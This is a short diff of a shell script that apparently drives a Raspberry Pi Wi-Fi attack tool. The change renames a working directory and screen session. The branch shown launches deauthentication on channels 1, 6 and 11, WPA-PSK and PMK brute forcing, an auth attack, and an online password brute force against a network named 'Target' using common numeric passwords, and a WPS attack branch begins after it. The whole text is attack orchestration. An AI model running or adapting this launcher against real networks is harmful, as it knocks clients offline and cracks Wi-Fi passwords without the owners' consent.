@@ -46,14 +46,14 @@ led red off 2>/dev/null
 if jmp 7; then # Default or example — adjust if needed
     echo "[*] wpa auth/deauth/online_brute attack (static/dynamic)"
     monitor_enable
-    cd /home/pi/wpaks || exit 1
-    screen -dmS wpaks -L -logfile "$time-wpaks.log" ./
+    cd /home/pi/wpapsk || exit 1
+    screen -dmS wpapsk -L -logfile "$time-wpapsk.log" ./
     #monitor.sh -c 1,6,11 -t deauth -X screen ./deauth.sh -b target.txt
-    screen -S wpaks -X screen -t deauth ./deauth.sh -c 1,6,11
-    screen -S wpaks -X screen -t brute ./brute-wpaks.sh
-    screen -S wpaks -X screen -t auth ./auth.sh
-    screen -S wpaks -X screen -t brute-pmk ./brute-pmk.sh
-    screen -S wpaks -X screen -t online_brute ./online-brute.sh wpa-brute-width.sh "Target" 12345678 123456789 1234567890
+    screen -S wpapsk -X screen -t deauth ./deauth.sh -c 1,6,11
+    screen -S wpapsk -X screen -t brute ./brute-wpapsk.sh
+    screen -S wpapsk -X screen -t auth ./auth.sh
+    screen -S wpapsk -X screen -t brute-pmk ./brute-pmk.sh
+    screen -S wpapsk -X screen -t online_brute ./online-brute.sh wpa-brute-width.sh "Target" 12345678 123456789 1234567890
 elif jmp 11; then
     echo "[*] wps attack (static/dynamic)"
     monitor_enable
